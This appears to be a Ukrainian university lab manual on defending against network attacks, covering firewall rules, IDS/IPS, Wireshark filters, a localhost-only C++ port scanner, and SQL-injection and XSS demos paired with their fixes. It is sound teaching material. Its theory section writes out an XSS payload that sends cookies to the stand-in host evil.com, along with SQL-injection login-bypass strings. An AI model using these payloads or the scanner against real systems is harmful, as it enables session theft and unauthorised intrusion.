---
title: "Програмні засоби захисту від атак з мережі Internet"
shortTitle: "Програмні засоби захисту від мережевих атак"
type: lab
order: 8
labNumber: 9
subject: pmzi
duration: "2 академічні години"
equipment:
  - "ПК з встановленим Wireshark або tcpdump"
  - "Доступ до командного рядка з правами адміністратора"
  - "Компілятор або інтерпретатор мови програмування за вибором студента"
  - "Віртуальна машина (опціонально, для безпечних експериментів)"
preview: "Вивчення засобів захисту від атак з мережі Internet."
---

**Мета:** вивчити основні типи мережевих атак та програмні засоби захисту від них. Навчитися аналізувати мережевий трафік, налаштовувати брандмауер та виявляти вразливості.

**Обладнання:** ПК з встановленим Wireshark або tcpdump; Доступ до командного рядка з правами адміністратора; Компілятор або інтерпретатор мови програмування за вибором студента; Віртуальна машина (опціонально, для безпечних експериментів).

**Тривалість:** 2 академічні години.

**УВАГА.** Робота змінює правила брандмауера й сканує порти. Виконуйте її у віртуальній машині або на власному комп'ютері, сканувати дозволено лише `127.0.0.1` та вузли, на які є письмовий дозвіл власника: несанкціоноване сканування чужих систем порушує закон. Перед зміною правил збережіть поточні (`iptables-save`, `netsh advfirewall export`), а наприкінці роботи видаліть усі створені правила.

## Передумови

| Вимога | Опис |
|--------|------|
| **Знання** | Лекція «Ідентифікація та аутентифікація. Загрози безпеки» |
| **Навички** | Основи мережевих протоколів TCP/IP |
| **Середовище** | ПК з встановленим Wireshark або tcpdump |

## Теоретичні відомості

### 1 Типи мережевих атак

```
┌─────────────────────────────────────────────────────────────────────┐
│                    КЛАСИФІКАЦІЯ МЕРЕЖЕВИХ АТАК                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ЗА МЕТОЮ:                                                          │
│  ├── Отримання доступу (Access attacks)                             │
│  │   ├── Підбір паролів (Brute force)                               │
│  │   ├── Експлуатація вразливостей                                  │
│  │   └── Man-in-the-Middle (MITM)                                   │
│  │                                                                  │
│  ├── Відмова в обслуговуванні (DoS/DDoS)                            │
│  │   ├── SYN Flood                                                  │
│  │   ├── UDP Flood                                                  │
│  │   └── Amplification attacks                                      │
│  │                                                                  │
│  └── Розвідка (Reconnaissance)                                      │
│      ├── Сканування портів                                          │
│      ├── Сканування вразливостей                                    │
│      └── DNS enumeration                                            │
│                                                                     │
│  ЗА РІВНЕМ OSI:                                                     │
│  ├── L2: ARP spoofing, MAC flooding                                 │
│  ├── L3: IP spoofing, ICMP attacks                                  │
│  ├── L4: TCP/UDP attacks, port scanning                             │
│  └── L7: SQL injection, XSS, CSRF                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 2 Брандмауер (Firewall)

Брандмауер — це програмний або апаратний засіб, який фільтрує мережевий трафік за заданими правилами.

**Типи брандмауерів:**

Таблиця 1 — Типи брандмауерів

| Тип             | Рівень | Особливості                 |
|-----------------|--------|-----------------------------|
| Пакетний фільтр | L3-L4  | Фільтрація за IP, портами   |
| Stateful        | L3-L4  | Відстеження з'єднань        |
| Application     | L7     | Аналіз протоколів HTTP, FTP |
| Next-Gen (NGFW) | L3-L7  | DPI, IPS, антивірус         |

**Базові правила:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ЛОГІКА ПРАВИЛ БРАНДМАУЕРА                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Правила перевіряються ПОСЛІДОВНО (зверху вниз)                     │
│  Перше правило, що підходить, визначає долю пакета                  │
│                                                                     │
│  Приклад набору правил:                                             │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ 1. ALLOW state=ESTABLISHED,RELATED (відповіді на наші запити)   ││
│  │ 2. ALLOW TCP dst-port=443 (HTTPS)                               ││
│  │ 3. ALLOW TCP dst-port=80  (HTTP)                                ││
│  │ 4. ALLOW ICMP type=8      (ping request)                        ││
│  │ 5. DENY ALL               (все інше заборонено)                 ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                     │
│  Принцип: "Deny by default" — заборонено все, крім явно дозволеного │
│                                                                     │
│  Правило 1 робить брандмауер stateful: без нього комп'ютер не       │
│  отримав би навіть відповіді DNS-сервера на власний запит           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3 IDS та IPS

**IDS (Intrusion Detection System)** — система виявлення вторгнень. Аналізує трафік і сповіщає про підозрілу активність.

**IPS (Intrusion Prevention System)** — система запобігання вторгненням. Не тільки виявляє, а й блокує атаки.

Таблиця 2 — Порівняння IDS та IPS

| Характеристика | IDS | IPS |
|----|----|----|
| Розташування | Поруч з трафіком (span port) | На шляху трафіку (inline) |
| Дія | Сповіщення | Блокування |
| Затримка | Мінімальна | Додає латентність |
| Помилкові спрацювання | Менш критичні | Можуть блокувати легітимний трафік |

**Методи виявлення:**

- **Сигнатурний**: пошук відомих патернів атак
- **Аномальний**: виявлення відхилень від нормальної поведінки
- **Евристичний**: аналіз підозрілої поведінки

### 4 Веб-вразливості (OWASP Top 10)

**SQL-ін'єкція:**

```
-- Вразливий код:
SELECT * FROM users WHERE login='$input' AND pass='$pass'

-- Атака:
login: admin'--
pass: anything

-- Результат:
SELECT * FROM users WHERE login='admin'--' AND pass='anything'
-- Коментар '--' ігнорує перевірку пароля
```

**XSS (Cross-Site Scripting):**

```
<!-- Вразливий код: -->
<p>Привіт, <?php echo $_GET['name']; ?></p>

<!-- Атака: -->
?name=<script>document.location='http://evil.com/s.php?c='+document.cookie</script>

<!-- Результат: виконання JavaScript у браузері жертви -->
```

**Захист:**

- SQL: параметризовані запити (prepared statements)
- XSS: екранування виводу, Content Security Policy (CSP)

### 5 Інструменти

Таблиця 3 — Інструменти аналізу мережевої безпеки

| Інструмент | Призначення        | Команда           |
|------------|--------------------|-------------------|
| Wireshark  | Аналіз трафіку     | GUI-інтерфейс     |
| tcpdump    | Захоплення пакетів | `tcpdump -i eth0` |
| nmap       | Сканування портів  | `nmap -sV target` |
| netstat    | Перегляд з'єднань  | `netstat -an`     |
| iptables   | Брандмауер Linux   | `iptables -L`     |

## Приклад виконання

### Завдання 1: Аналіз мережевого трафіку

#### Windows (PowerShell)

```powershell
# Перегляд активних TCP-з'єднань
Get-NetTCPConnection | Where-Object State -eq 'Established' |
    Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress

# Перегляд активних UDP-з'єднань
Get-NetUDPEndpoint | Select-Object LocalPort, OwningProcess

# Визначення процесу за PID
Get-Process -Id 1234 | Select-Object Name, Path
```

#### Linux (bash)

```bash
# Активні з'єднання
ss -tunapl

# Або через netstat
netstat -tunapl | grep ESTABLISHED

# Захоплення HTTP-трафіку (any — усі інтерфейси: у сучасних
# дистрибутивах мережева карта зветься не eth0, а, наприклад, enp0s3)
sudo tcpdump -i any port 80 -A | head -50
```

#### Wireshark

1. Запустіть Wireshark
2. Виберіть мережевий інтерфейс
3. Застосуйте фільтр: `http` або `tcp.port == 443`
4. Проаналізуйте захоплені пакети

**Корисні фільтри Wireshark:**

| Фільтр                                     | Опис                           |
|--------------------------------------------|--------------------------------|
| `ip.addr == 192.168.1.1`                   | Трафік з/на IP-адресу          |
| `tcp.port == 80`                           | HTTP-трафік                    |
| `http.request.method == "POST"`            | POST-запити                    |
| `dns`                                      | DNS-запити                     |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN-пакети (початок з'єднання) |

### Завдання 2: Налаштування брандмауера

#### Windows Firewall (PowerShell з правами адміністратора)

```powershell
# Перегляд поточних правил
Get-NetFirewallRule | Where-Object Enabled -eq True |
    Select-Object DisplayName, Direction, Action

# Створення правила: блокувати вхідні на порт 23 (Telnet)
New-NetFirewallRule -DisplayName "Block Telnet" `
    -Direction Inbound `
    -LocalPort 23 `
    -Protocol TCP `
    -Action Block

# Створення правила: дозволити вхідні на порт 443 (HTTPS)
New-NetFirewallRule -DisplayName "Allow HTTPS" `
    -Direction Inbound `
    -LocalPort 443 `
    -Protocol TCP `
    -Action Allow

# Видалення правила
Remove-NetFirewallRule -DisplayName "Block Telnet"

# Перевірка статусу брандмауера
Get-NetFirewallProfile | Select-Object Name, Enabled
```

#### Linux iptables

```bash
# Перегляд поточних правил і резервна копія
sudo iptables -L -n -v
sudo iptables-save | sudo tee /root/iptables.backup > /dev/null

# Спершу — те, без чого машина втратить мережу:
# локальний інтерфейс і відповіді на з'єднання, які ми відкрили самі
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Якщо працюєте у ВМ через SSH — дозволити його ДО заборони
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Дозволити вхідні на порти 80 і 443
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Заблокувати вхідні з конкретної IP
sudo iptables -A INPUT -s 10.0.0.100 -j DROP

# Заборонити все інше (в кінці)
sudo iptables -A INPUT -j DROP

# Відновити початковий стан після роботи
sudo iptables-restore < /root/iptables.backup
```

Два підводні камені. Перенаправлення `sudo iptables-save > /etc/файл` не спрацює: `>` виконує ваша оболонка без прав root, тому тут використано `tee`. І в Ubuntu, Debian та Fedora команда `iptables` насправді працює поверх nftables, а для простих правил зручніша обгортка `ufw` (`sudo ufw deny 23/tcp`).

### Завдання 3: Сканування портів

**Увага**: сканування портів без дозволу власника системи є незаконним. Використовуйте тільки на власних системах або з явного дозволу.

#### Перевірка відкритих портів локально

```powershell
# Windows: перевірка прослуховуваних портів
Get-NetTCPConnection -State Listen |
    Select-Object LocalPort, OwningProcess |
    Sort-Object LocalPort

# Визначення процесів
Get-NetTCPConnection -State Listen |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            Port = $_.LocalPort
            Process = $proc.Name
            Path = $proc.Path
        }
    } | Sort-Object Port
```

```bash
# Linux
ss -tuln | grep LISTEN
```

#### Базове сканування портів

```cpp
// Сканер портів. Збірка у Visual Studio: проєкт консольного застосунку,
// у властивостях додати бібліотеку ws2_32.lib
// (Linker → Input → Additional Dependencies).
#include <iostream>
#include <string>
#include <vector>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "ws2_32.lib")
  using socket_t = SOCKET;
  const socket_t INVALID_SOCK = INVALID_SOCKET;
#else
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  using socket_t = int;
  const socket_t INVALID_SOCK = -1;
  #define closesocket close
#endif

struct ServiceName {
    int port;
    const char* name;
};

const ServiceName KNOWN_SERVICES[] = {
    {21, "FTP"},   {22, "SSH"},   {23, "Telnet"}, {25, "SMTP"},
    {53, "DNS"},   {80, "HTTP"},  {110, "POP3"},  {143, "IMAP"},
    {443, "HTTPS"},{445, "SMB"},  {3306, "MySQL"},{3389, "RDP"},
    {5432, "PostgreSQL"}, {8080, "HTTP-alt"}
};

const char* serviceName(int port) {
    for (const ServiceName& service : KNOWN_SERVICES) {
        if (service.port == port) return service.name;
    }
    return "Unknown";
}

// Спроба встановити з'єднання: успіх означає, що порт відкритий
bool isPortOpen(const std::string& host, int port, int timeoutMs = 500) {
    socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCK) return false;

    // Обмежуємо час очікування. На Linux connect() зважає на SO_SNDTIMEO;
    // Windows цей параметр для connect() ігнорує, і там надійний тайм-аут
    // потребує неблокувального сокета й select(). Для 127.0.0.1 це не
    // важливо: закритий порт відповідає відмовою (RST) миттєво
#ifdef _WIN32
    DWORD timeout = static_cast<DWORD>(timeoutMs);
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,
               reinterpret_cast<const char*>(&timeout), sizeof(timeout));
#else
    timeval timeout{ timeoutMs / 1000, (timeoutMs % 1000) * 1000 };
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
#endif

    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_port = htons(static_cast<unsigned short>(port));
    inet_pton(AF_INET, host.c_str(), &address.sin_addr);

    bool opened =
        connect(sock, reinterpret_cast<sockaddr*>(&address), sizeof(address)) == 0;
    closesocket(sock);
    return opened;
}

int main() {
    // УВАГА: сканувати дозволено лише власний комп'ютер або вузол,
    // на який є письмовий дозвіл власника
    const std::string target = "127.0.0.1";
    const std::vector<int> ports = {
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
        443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080
    };

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "Не вдалося ініціалізувати Winsock\n";
        return 1;
    }
#endif

    std::cout << "Сканування " << target << "...\n\n";
    std::cout << "Відкриті порти:\n";

    int found = 0;
    for (int port : ports) {
        if (isPortOpen(target, port)) {
            std::cout << "  " << port << "/tcp - " << serviceName(port) << "\n";
            ++found;
        }
    }

    if (found == 0) {
        std::cout << "  (жодного з перевірених портів не відкрито)\n";
    }

#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
```

### Завдання 4: Захист веб-застосунку

#### Демонстрація SQL-ін'єкції та захисту

```cpp
// Демонстрація SQL-ін'єкції та захисту від неї.
// Потрібна бібліотека SQLite: у Visual Studio додайте sqlite3.c і sqlite3.h
// до проєкту (амальгама з sqlite.org) або підключіть пакет через NuGet.
#include <iostream>
#include <string>
#include "sqlite3.h"

// Створює навчальну базу в пам'яті з двома обліковими записами.
// Паролі лежать відкрито лише для наочності атаки; у справжній системі
// зберігають хеш Argon2id (лекція «Ідентифікація та аутентифікація»)
sqlite3* setupDatabase() {
    sqlite3* db = nullptr;
    sqlite3_open(":memory:", &db);

    const char* schema =
        "CREATE TABLE users ("
        "  id INTEGER PRIMARY KEY,"
        "  login TEXT NOT NULL,"
        "  password TEXT NOT NULL,"
        "  role TEXT DEFAULT 'user');"
        "INSERT INTO users (login, password, role) "
        "VALUES ('admin', 'secret123', 'admin');"
        "INSERT INTO users (login, password, role) "
        "VALUES ('user1', 'pass1', 'user');";

    sqlite3_exec(db, schema, nullptr, nullptr, nullptr);
    return db;
}

// ВРАЗЛИВИЙ варіант: запит склеюється з рядків, дані користувача
// потрапляють у текст запиту й змінюють його структуру
bool vulnerableLogin(sqlite3* db, const std::string& login,
                     const std::string& password) {
    std::string query = "SELECT login, role FROM users WHERE login='" + login +
                        "' AND password='" + password + "'";
    std::cout << "[ВРАЗЛИВИЙ] Запит:\n  " << query << "\n";

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        std::cout << "[ВРАЗЛИВИЙ] Помилка SQL: " << sqlite3_errmsg(db) << "\n";
        return false;
    }

    bool found = (sqlite3_step(stmt) == SQLITE_ROW);
    if (found) {
        std::cout << "[ВРАЗЛИВИЙ] Вхід виконано як: "
                  << sqlite3_column_text(stmt, 0) << " (роль "
                  << sqlite3_column_text(stmt, 1) << ")\n";
    }
    sqlite3_finalize(stmt);
    return found;
}

// БЕЗПЕЧНИЙ варіант: структура запиту фіксована, дані передаються
// окремо через параметри й ніколи не тлумачаться як код SQL
bool safeLogin(sqlite3* db, const std::string& login, const std::string& password) {
    const char* query = "SELECT login, role FROM users WHERE login=? AND password=?";
    std::cout << "[БЕЗПЕЧНИЙ] Запит:\n  " << query << "\n";
    std::cout << "[БЕЗПЕЧНИЙ] Параметри: ('" << login << "', '" << password << "')\n";

    sqlite3_stmt* stmt = nullptr;
    sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);
    sqlite3_bind_text(stmt, 1, login.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, password.c_str(), -1, SQLITE_TRANSIENT);

    bool found = (sqlite3_step(stmt) == SQLITE_ROW);
    if (found) {
        std::cout << "[БЕЗПЕЧНИЙ] Вхід виконано як: "
                  << sqlite3_column_text(stmt, 0) << "\n";
    }
    sqlite3_finalize(stmt);
    return found;
}

int main() {
    sqlite3* db = setupDatabase();

    std::cout << "=== Коректний вхід ===\n";
    vulnerableLogin(db, "admin", "secret123");

    std::cout << "\n=== Атака SQL-ін'єкцією ===\n";
    // Введене значення закриває лапку й додає умову, істинну завжди
    std::string injection = "' OR '1'='1";
    bool bypassed = vulnerableLogin(db, "admin", injection);
    std::cout << "Результат: "
              << (bypassed ? "ЗАХИСТ ОБІЙДЕНО" : "доступ відхилено") << "\n";

    std::cout << "\n=== Та сама атака на параметризованому запиті ===\n";
    bool blocked = safeLogin(db, "admin", injection);
    std::cout << "Результат: "
              << (blocked ? "ЗАХИСТ ОБІЙДЕНО" : "доступ відхилено") << "\n";

    sqlite3_close(db);
    return 0;
}
```
Результат роботи програми:

```
=== Коректний вхід ===
[ВРАЗЛИВИЙ] Запит:
  SELECT login, role FROM users WHERE login='admin' AND password='secret123'
[ВРАЗЛИВИЙ] Вхід виконано як: admin (роль admin)

=== Атака SQL-ін'єкцією ===
[ВРАЗЛИВИЙ] Запит:
  SELECT login, role FROM users WHERE login='admin' AND password='' OR '1'='1'
[ВРАЗЛИВИЙ] Вхід виконано як: admin (роль admin)
Результат: ЗАХИСТ ОБІЙДЕНО

=== Та сама атака на параметризованому запиті ===
[БЕЗПЕЧНИЙ] Запит:
  SELECT login, role FROM users WHERE login=? AND password=?
[БЕЗПЕЧНИЙ] Параметри: ('admin', '' OR '1'='1')
Результат: доступ відхилено
```

Подивіться на другий запит: введений «пароль» закрив лапку й дописав умову `OR '1'='1'`, яка істинна для кожного рядка таблиці. Оскільки AND виконується раніше за OR, запит повертає всі записи, і перший з них — адміністратор. У параметризованому запиті те саме значення лишилося просто рядком символів, який не збігся з жодним паролем.

#### Демонстрація XSS та захисту

```cpp
#include <iostream>
#include <string>

// Екранування для HTML: символи, що мають у розмітці особливе значення,
// замінюються сутностями, і браузер показує їх як текст, а не виконує
std::string htmlEscape(const std::string& input) {
    std::string out;
    for (char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;
        }
    }
    return out;
}

int main() {
    const std::string name = "<script>alert(\"XSS\")</script>";

    std::cout << "Введено: " << name << "\n\n";
    std::cout << "Без захисту:\n  <p>Привіт, " << name << "</p>\n";
    std::cout << "  -> браузер виконає скрипт\n\n";
    std::cout << "З екрануванням:\n  <p>Привіт, " << htmlEscape(name) << "</p>\n";
    std::cout << "  -> браузер покаже скрипт як звичайний текст\n";
    return 0;
}
```

Результат роботи програми:

```
Введено: <script>alert("XSS")</script>

Без захисту:
  <p>Привіт, <script>alert("XSS")</script></p>
  -> браузер виконає скрипт

З екрануванням:
  <p>Привіт, &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>
  -> браузер покаже скрипт як звичайний текст
```

## Порядок виконання роботи

1. Отримати в викладача номер індивідуального варіанта.

2. Аналіз мережевого трафіку: запустити Wireshark на основному інтерфейсі, відвідати кілька сайтів через HTTP і HTTPS, знайти HTTP-запити й порівняти, що видно у відкритому та зашифрованому трафіку; застосувати фільтри з таблиці.

3. Налаштування брандмауера: зберегти поточні правила, створити правило блокування й правило дозволу для портів свого варіанта, перевірити їхню дію, після чого видалити тестові правила й відновити початковий стан.

4. Сканування портів: визначити відкриті порти на `127.0.0.1` командами ОС і власним сканером, зіставити їх із процесами, що їх прослуховують.

5. Захист веб-застосунку: запустити демонстрацію SQL-ін'єкції та XSS, показати успішну атаку на вразливий варіант і її блокування безпечним.

6. Виконати індивідуальне завдання згідно з варіантом.

7. Оформити звіт та зробити висновок.

## Вимоги до звіту

Звіт оформлюється на бланку встановленого зразка і має містити:

- тему, мету та обладнання;
- постановку задачі за індивідуальним варіантом;
- знімки екрана Wireshark з фільтрами;
- команди та результати налаштування брандмауера;
- результати сканування портів з ідентифікацією сервісів;
- код та результати демонстрації SQL-ін'єкції та XSS;
- результат виконання індивідуального завдання;
- висновок про методи захисту від мережевих атак.

## Варіанти індивідуальних завдань

| № | Порт для блокування | Порт для дозволу | Додаткове завдання |
|----|----|----|----|
| 1 | 21 (FTP) | 443 (HTTPS) | Знайти в Wireshark DNS-запити. Які домени запитувалися? |
| 2 | 23 (Telnet) | 80 (HTTP) | Реалізувати детектор SYN-сканування (багато SYN без ACK). |
| 3 | 25 (SMTP) | 993 (IMAPS) | Знайти в трафіку User-Agent браузера. Яку інформацію він розкриває? |
| 4 | 110 (POP3) | 995 (POP3S) | Реалізувати фільтр для виявлення підозрілих POST-запитів. |
| 5 | 135 (RPC) | 3389 (RDP) | Порівняти HTTP та HTTPS трафік. Що видно в кожному? |
| 6 | 139 (NetBIOS) | 445 (SMB) | Знайти ARP-запити в трафіку. Для чого вони використовуються? |
| 7 | 143 (IMAP) | 587 (SMTP) | Реалізувати простий rate limiter для захисту від brute force. |
| 8 | 445 (SMB) | 22 (SSH) | Проаналізувати TLS handshake. Які версії протоколу використовуються? |
| 9 | 1433 (MSSQL) | 5432 (PostgreSQL) | Знайти ICMP-пакети. Що показує ping? |
| 10 | 3306 (MySQL) | 8080 (HTTP-alt) | Реалізувати перевірку на CSRF-токени. |
| 11 | 5900 (VNC) | 443 (HTTPS) | Знайти в трафіку cookies. Які дані вони містять? |
| 12 | 8080 (HTTP-alt) | 80 (HTTP) | Реалізувати whitelist IP-адрес у брандмауері. |
| 13 | 1521 (Oracle) | 443 (HTTPS) | Визначити операційну систему за TTL пакетів. |
| 14 | 27017 (MongoDB) | 443 (HTTPS) | Реалізувати логування всіх заблокованих з'єднань. |
| 15 | 6379 (Redis) | 443 (HTTPS) | Знайти в трафіку Referer заголовки. Яку інформацію вони розкривають? |
| 16 | 11211 (Memcached) | 443 (HTTPS) | Реалізувати детектор port knocking. |
| 17 | 5432 (PostgreSQL) | 3306 (MySQL) | Порівняти час відповіді різних сервісів. Що це показує? |
| 18 | 9200 (Elasticsearch) | 443 (HTTPS) | Реалізувати перевірку Content-Type для захисту API. |
| 19 | 15672 (RabbitMQ) | 443 (HTTPS) | Знайти в трафіку WebSocket-з'єднання. |
| 20 | 2375 (Docker) | 443 (HTTPS) | Реалізувати blacklist IP-адрес після 5 невдалих спроб. |

## Контрольні запитання

Запитання згруповано за рівнями навчальних досягнень. Для позитивної оцінки студент має відповісти на запитання середнього рівня, оцінка «добре» потребує відповідей достатнього рівня, оцінка «відмінно» — високого.

### Середній рівень (репродуктивний)

1. Що таке брандмауер і які його типи існують?
2. Чим IDS відрізняється від IPS?
3. Які порти потребують захисту в першу чергу?
4. Що таке сканування портів?
5. Що таке SQL-ін'єкція?
6. Що таке XSS і які його типи існують?
7. Що таке OWASP Top 10?
8. Що таке Content Security Policy?

### Достатній рівень (конструктивно-варіативний)

1. Чим stateful firewall кращий за простий пакетний фільтр?
2. Як виявити сканування портів у мережевому трафіку? За якими ознаками?
3. Як параметризовані запити унеможливлюють SQL-ін'єкцію?
4. Чому екранування виводу захищає від XSS, а фільтрація вводу — не завжди?
5. Коли доцільніший IDS, а коли IPS? Наведіть по одному сценарію.
6. Запишіть правило брандмауера, яке дозволяє лише вихідні з'єднання на порт 443.
7. Чому HTTPS не захищає від усіх атак? Наведіть два приклади.
8. Як CSP обмежує наслідки успішної XSS-атаки?

### Високий рівень (творчий)

1. Побудуйте ешелоновану схему захисту веб-застосунку: які засоби на якому рівні та проти яких загроз працюють.
2. Система виявлення вторгнень дає багато хибних спрацьовувань. Назвіть причини та порядок налаштування, щоб їх зменшити без втрати чутливості.
3. Оцініть, чому повне блокування вхідного трафіку не є універсальним розв'язанням, і сформулюйте критерій відкриття порту.
4. Сформулюйте, чому більшість успішних атак використовує не технічні вразливості, а помилки конфігурації та людський фактор. Проілюструйте прикладами з роботи.

## Критерії оцінювання

Робота оцінюється за загальними критеріями курсу — див. [Критерії оцінювання лабораторних робіт](#/02-software-security-methods/grading).

## Cheat Sheet

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ШПАРГАЛКА: МЕРЕЖЕВА БЕЗПЕКА                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ФІЛЬТРИ WIRESHARK:                                                 │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ http.request         → HTTP-запити                              ││
│  │ tcp.port == 443      → HTTPS-трафік                             ││
│  │ ip.addr == X.X.X.X   → Трафік з/на IP                           ││
│  │ dns                  → DNS-запити                               ││
│  │ tcp.flags.syn == 1   → SYN-пакети                               ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                     │
│  WINDOWS FIREWALL (PowerShell):                                     │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ Get-NetFirewallRule            → Список правил                  ││
│  │ New-NetFirewallRule ...        → Створити правило               ││
│  │ Remove-NetFirewallRule ...     → Видалити правило               ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                     │
│  LINUX IPTABLES:                                                    │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ iptables -L           → Список правил                           ││
│  │ iptables -A INPUT ... → Додати правило                          ││
│  │ iptables -D INPUT ... → Видалити правило                        ││
│  │ спершу: -i lo і --ctstate ESTABLISHED,RELATED → ACCEPT          ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                     │
│  ЗАХИСТ ВІД ІН'ЄКЦІЙ:                                               │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ SQL: sqlite3_prepare_v2(...) + sqlite3_bind_text(...)           ││
│  │ XSS: htmlEscape(userInput): & < > " ' → сутності HTML           ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```
